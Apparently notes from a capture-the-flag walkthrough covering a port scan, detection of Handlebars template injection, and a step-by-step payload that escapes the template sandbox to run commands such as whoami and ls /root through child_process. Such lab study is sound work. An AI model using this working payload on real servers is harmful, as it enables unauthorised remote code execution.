[[ping]] the host
sudo nmap -sC -sV -p- --min-rate=1000 \[host]
*open host IP in browser*
*test Email input field by trying different SSTI detection techniques*
{{7 * 7}}
*use Burpsuite and use below payloadm but URL encode it first*
{#with "s" as |string|}}
	 {{#with "e"}}
		 {{#with split as |conslist|}}
			 {{this.pop}}
			 {{this.push (lookup string.sub "constructor")}}
			 {{this.pop}}
			 {{#with string.split as |codelist|}}
				 {{this.pop}}
				 {{this.push "return require('child_process').exec('whoami');"}}
				 {{this.pop}}
				 {{#each conslist}}
				 {{#with (string.sub.apply 0 codelist)}}
					 {{this}}
				 {{/with}}
			 {{/each}}
		 {{/with}}
	 {{/with}}
  {{/with}}
{{/with}}

*The above code is attempting to load the Child Process module into memory and use it to execute system commands (in this case whoami ). Template Engines are often Sandboxed, meaning their code runs in a restricted code space so that in the event of malicious code being run, it will be very hard to load modules that can run system commands. If we cannot directly use require to load such modules, we will have to find a different way*

Replace {{this.push "return require('child_process').exec('whoami');"}} with
{{this.push "return process;"}}
*Then with this:*
{{this.push "return process.mainModule;"}}
*Since handlebars is running in a sandboxed environment, we might be able to use the mainModule property to directly load the main function and since the main function is most probably not sandboxed, load require from there. Let's modify our payload once more to see if mainModule is accessible. No error this time either and we see an extra object at the end of the response, which means the property is indeed available. Now lets attempt to call require and load a module. We can load the child_process module as it is available on default Node.js installations and can be used to execute system commands. Modify the payload as follows:* 

{{this.push "return process.mainModule.require('child_process');"}}

*The require object has been called successfully and the child_process module loaded. Let's now attempt to run system commands.*

{{this.push "return process.mainModule.require('child_process').execSync('ls /root');"}}
